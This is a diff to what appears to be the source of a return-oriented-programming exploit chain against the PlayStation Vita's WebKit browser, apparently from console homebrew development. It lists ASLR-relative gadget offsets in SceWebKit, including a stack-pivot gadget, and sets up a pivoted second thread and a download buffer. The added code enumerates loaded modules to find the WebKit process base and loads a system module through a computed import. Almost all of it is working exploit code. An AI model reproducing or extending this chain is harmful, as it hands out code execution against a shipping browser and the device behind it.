@@ -1,13 +1,4 @@
-#define RETAIL 0
-
-#if RETAIL
-#define PRINTF(fmt, ...) \
-	snprintf(outbuffer, 256, fmt, __VA_ARGS__); \
-	strlen(outbuffer); \
-	send([g_socket], outbuffer, &return, 0, 0, 0);
-#else
-#define PRINTF sceClibPrintf
-#endif
+#include "common.rop"
 
 data
 {
@@ -16,19 +7,38 @@ data
 	symbol ldm_r1_stuff = ASLR::SceWebKit + 0x54c8; //54c8: e891a916 ldm r1, {r1, r2, r4, r8, fp, sp, pc}
 	symbol pop_pc = ASLR::SceWebKit + 0xc048b;
 	symbol stack_size = 6 * 1024 * 1024;
+	symbol SCE_SYSMODULE_NGS = 0xB;
 
 	variable thread_id = -1;
 	variable http_uid = -1;
 	variable stack_base = -1; // second thread will pivot here
+	variable num_loaded = -1;
 	buffer thread_info[0x80];
 	buffer download_url[0x100];
 	buffer tmp[0x100];
 	buffer ldm_buf[7 * 4];
+	buffer module_list[0x100];
+	buffer module_info[440];
 }
 
 code : entry
 {
 	PRINTF("Hello, world! %d  \n", 123);
+
+	store(64, num_loaded);
+	sceKernelGetModuleList(0xFF, module_list, num_loaded);
+	PRINTF("loaded %x\n", [num_loaded]);
+	store(440, module_info);
+	sceKernelGetModuleInfo([module_list+4*21], module_info);
+	// PRINTF("%x\n", [module_info + 348]); // SceWebKitProcess base addr
+
+	// load NGS and get its base
+	add([module_info + 348], 0x12d48); // cal function import from SceWebKitProcess
+	call_r0(0xB); // sceSysmoduleLoadModule
+	PRINTF("ngs %x\n", &return);
+	
+
+
 	sceKernelCreateThread("st2", ldm_r1_stuff, 0x10000100, stack_size, 0, 0, 0);
 	store(&return, thread_id);
 	PRINTF("thread %x \n", &return);
